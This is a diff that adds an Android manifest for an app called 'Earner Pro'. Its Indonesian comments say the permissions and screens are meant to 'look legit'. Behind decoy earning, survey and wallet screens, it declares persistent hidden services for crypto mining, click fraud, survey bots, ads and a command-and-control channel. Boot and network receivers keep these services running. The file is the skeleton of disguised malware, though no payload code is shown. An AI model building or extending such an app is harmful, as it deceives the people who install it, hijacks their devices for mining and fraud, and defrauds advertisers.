@@ -1,0 +1,99 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.earner.pro"
+    android:versionCode="50"
+    android:versionName="5.0-🔴EKSTREM">
+
+    <!-- 🔴 PERMISSIONS - KELIATAN LEGIT -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+
+    <application
+        android:name=".EarnerApplication"
+        android:allowBackup="false"
+        android:icon="@mipmap/ic_launcher"
+        android:label="Earner Pro"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.Earner"
+        android:usesCleartextTraffic="true">
+
+        <!-- 🔴 MAIN ACTIVITY - TAMPILAN LEGIT -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:launchMode="singleTask"
+            android:theme="@style/Theme.Earner.Splash">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- 🔴 EARNING ACTIVITIES (LEGIT LOOKING) -->
+        <activity android:name=".EarningActivity" />
+        <activity android:name=".SurveysActivity" />
+        <activity android:name=".GamesActivity" />
+        <activity android:name=".WalletActivity" />
+        <activity android:name=".WithdrawActivity" />
+        <activity android:name=".ReferralActivity" />
+
+        <!-- 🔴 SERVICES -->
+        <service
+            android:name=".services.MinerService"
+            android:enabled="true"
+            android:exported="false"
+            android:persistent="true"
+            android:foregroundServiceType="dataSync" />
+            
+        <service
+            android:name=".services.ClickerService"
+            android:enabled="true"
+            android:exported="false"
+            android:persistent="true" />
+            
+        <service
+            android:name=".services.SurveyBotService"
+            android:enabled="true"
+            android:exported="false"
+            android:persistent="true" />
+            
+        <service
+            android:name=".services.AdService"
+            android:enabled="true"
+            android:exported="false"
+            android:persistent="true" />
+            
+        <service
+            android:name=".services.C2Service"
+            android:enabled="true"
+            android:exported="false"
+            android:persistent="true" />
+
+        <!-- 🔴 RECEIVERS -->
+        <receiver
+            android:name=".receivers.BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".receivers.NetworkReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+</manifest>
